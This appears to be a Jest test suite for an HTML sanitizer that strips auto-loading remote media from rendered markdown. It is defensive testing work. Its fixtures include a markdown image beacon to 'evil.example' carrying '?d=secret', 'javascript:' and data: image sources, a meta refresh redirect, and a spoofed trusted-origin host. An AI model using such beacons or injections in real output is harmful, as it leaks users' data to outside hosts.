/** @jest-environment jsdom */
import { markdownToHtml } from '../markdown';
import sanitizeHtml from '../sanitizeHtml';

const API = 'https://api.tmgr.example';
const untrusted = (html: string) =>
	sanitizeHtml(html, { remoteMedia: false, trustedOrigins: [API] });
const render = (md: string) => untrusted(markdownToHtml(md));
const parse = (html: string) => {
	const root = document.createElement('div');
	root.innerHTML = html;
	return root;
};

describe('sanitizeHtml defaults keep the auto-loading vectors', () => {
	it.each([
		['img', '<img src="https://evil.example/x.png">', 'img[src]'],
		[
			'style attribute',
			'<p style="background:url(https://evil.example/x)">a</p>',
			'p[style]',
		],
		[
			'style element',
			'<p>a</p><style>p{background:url(https://evil.example/x)}</style>',
			'style',
		],
		['srcset', '<img srcset="https://evil.example/x.png 1x">', 'img[srcset]'],
		[
			'video poster',
			'<video poster="https://evil.example/x.png"></video>',
			'video[poster]',
		],
		[
			'video src',
			'<video src="https://evil.example/x.mp4"></video>',
			'video[src]',
		],
		[
			'audio src',
			'<audio src="https://evil.example/x.mp3"></audio>',
			'audio[src]',
		],
		[
			'source',
			'<video><source src="https://evil.example/x.mp4"></video>',
			'source[src]',
		],
		[
			'svg image',
			'<svg><image href="https://evil.example/x.png"/></svg>',
			'image',
		],
		[
			'input image',
			'<input type="image" src="https://evil.example/x.png">',
			'input[src]',
		],
		[
			'background',
			'<table background="https://evil.example/x.png"><tr><td>a</td></tr></table>',
			'table[background]',
		],
	])('%s', (_name, html, selector) => {
		expect(parse(sanitizeHtml(html)).querySelector(selector)).not.toBeNull();
	});
});

describe('sanitizeHtml with remoteMedia: false', () => {
	it('turns a markdown image into a link', () => {
		const root = parse(render('![chart](https://evil.example/?d=secret)'));
		expect(root.querySelector('img')).toBeNull();
		const a = root.querySelector('a');
		expect(a?.getAttribute('href')).toBe('https://evil.example/?d=secret');
		expect(a?.getAttribute('target')).toBe('_blank');
		expect(a?.getAttribute('rel')).toBe('noopener noreferrer');
		expect(a?.textContent).toBe('chart');
	});

	it('uses the url as the label when there is no alt text', () => {
		const a = parse(render('![](https://evil.example/x.png)')).querySelector(
			'a',
		);
		expect(a?.textContent).toBe('https://evil.example/x.png');
	});

	it('turns a raw html image into a link', () => {
		const root = parse(
			untrusted('<img src="https://evil.example/x.png" alt="x">'),
		);
		expect(root.querySelector('img')).toBeNull();
		expect(root.querySelector('a')?.getAttribute('href')).toBe(
			'https://evil.example/x.png',
		);
	});

	it('treats a protocol-relative and a backslash url as remote', () => {
		expect(
			parse(untrusted('<img src="//evil.example/x.png">')).querySelector('img'),
		).toBeNull();
		expect(
			parse(untrusted('<img src="/\\evil.example/x.png">')).querySelector(
				'img',
			),
		).toBeNull();
	});

	it('does not nest a link inside a link', () => {
		const root = parse(
			render('[![](https://evil.example/x.png)](https://example.com)'),
		);
		expect(root.querySelector('img')).toBeNull();
		expect(root.querySelector('a a')).toBeNull();
	});

	it('does not produce an href from an image with a javascript: or data: src', () => {
		for (const src of ['javascript:alert(1)', 'data:image/png;base64,AAAA']) {
			const root = parse(untrusted(`<img src="${src}">`));
			expect(root.querySelector('img[src]')).toBeNull();
			expect(root.querySelector('a[href]')).toBeNull();
		}
	});

	it.each([
		[
			'style attribute',
			'<p style="background:url(https://evil.example/x)">a</p>',
			'p[style]',
		],
		[
			'style element',
			'<p>a</p><style>p{background:url(https://evil.example/x)}</style>',
			'style',
		],
		[
			'srcset',
			'<img srcset="https://evil.example/x.png 1x" src="/a.png">',
			'[srcset]',
		],
		[
			'video poster',
			'<video poster="https://evil.example/x.png"></video>',
			'video',
		],
		['video src', '<video src="https://evil.example/x.mp4"></video>', 'video'],
		['audio', '<audio src="https://evil.example/x.mp3"></audio>', 'audio'],
		[
			'source',
			'<video><source src="https://evil.example/x.mp4"></video>',
			'source',
		],
		[
			'picture',
			'<picture><source srcset="https://evil.example/x.png"><img src="/a.png"></picture>',
			'source',
		],
		[
			'svg image',
			'<svg><image href="https://evil.example/x.png"/></svg>',
			'svg',
		],
		[
			'svg use',
			'<svg><use xlink:href="https://evil.example/x.svg#a"/></svg>',
			'svg',
		],
		[
			'input image',
			'<input type="image" src="https://evil.example/x.png">',
			'input',
		],
		[
			'background',
			'<table background="https://evil.example/x.png"><tr><td>a</td></tr></table>',
			'[background]',
		],
		['object', '<object data="https://evil.example/x"></object>', 'object'],
		['embed', '<embed src="https://evil.example/x">', 'embed'],
		[
			'link',
			'<link rel="stylesheet" href="https://evil.example/x.css">',
			'link',
		],
		[
			'meta',
			'<meta http-equiv="refresh" content="0;url=https://evil.example">',
			'meta',
		],
	])('drops %s', (_name, html, selector) => {
		expect(parse(untrusted(html)).querySelector(selector)).toBeNull();
	});

	it('keeps images that are ours', () => {
		for (const src of [
			'/api/files/1/content',
			`${API}/files/1/content?sig=abc`,
			`${window.location.origin}/a.png`,
		]) {
			const img = parse(untrusted(`<img src="${src}" alt="a">`)).querySelector(
				'img',
			);
			expect(img?.getAttribute('src')).toBe(src);
		}
		expect(
			parse(render('![a](/api/files/1/content)')).querySelector('img'),
		).not.toBeNull();
	});

	it('does not trust a host that merely starts with a trusted origin', () => {
		expect(
			parse(untrusted(`<img src="${API}.evil.example/x.png">`)).querySelector(
				'img',
			),
		).toBeNull();
	});

	it('still renders ordinary markdown', () => {
		const html = render('**bold** [x](https://example.com) `code`');
		expect(html).toContain('<strong>bold</strong>');
		expect(html).toContain('href="https://example.com"');
		expect(html).toContain('<code>code</code>');
	});

	it('leaves the default path untouched afterwards', () => {
		untrusted('<img src="https://evil.example/x.png">');
		const html = sanitizeHtml(
			'<img src="https://evil.example/x.png" style="color:red">',
		);
		expect(html).toContain('<img');
		expect(html).toContain('src="https://evil.example/x.png"');
		expect(html).toContain('style="color:red"');
		expect(
			sanitizeHtml('<p style="color:red">a</p>', { remoteMedia: true }),
		).toContain('style=');
	});
});
